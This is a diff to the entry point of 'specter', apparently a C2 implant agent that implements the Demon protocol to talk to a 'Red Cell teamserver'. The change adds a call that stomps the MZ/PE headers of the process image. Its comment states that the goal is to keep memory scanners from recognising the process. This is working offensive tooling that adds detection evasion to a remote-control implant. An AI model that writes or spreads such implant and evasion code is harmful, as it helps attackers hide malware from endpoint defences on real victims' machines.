@@ -3,7 +3,7 @@
 //! Implements the Demon binary protocol (0xDEADBEEF magic, AES-256-CTR,
 //! per-agent key exchange) for full compatibility with the Red Cell teamserver.
 
-use tracing::info;
+use tracing::{info, warn};
 use tracing_subscriber::EnvFilter;
 
 use specter::{SpecterAgent, SpecterConfig};
@@ -17,6 +17,13 @@ async fn main() -> anyhow::Result<()> {
         .init();
 
     info!("specter agent starting");
+
+    // Erase the MZ/PE signature from the module image so that memory scanners
+    // cannot identify this process as a Portable Executable by its header.
+    // This is a one-shot permanent stomp; errors are non-fatal.
+    if let Err(e) = specter::pe_stomp::stomp_pe_headers() {
+        warn!("PE header stomp failed: {e}");
+    }
 
     let config = SpecterConfig::from_sources(std::env::args_os(), std::env::vars_os())?;
     let mut agent = SpecterAgent::new(config)?;
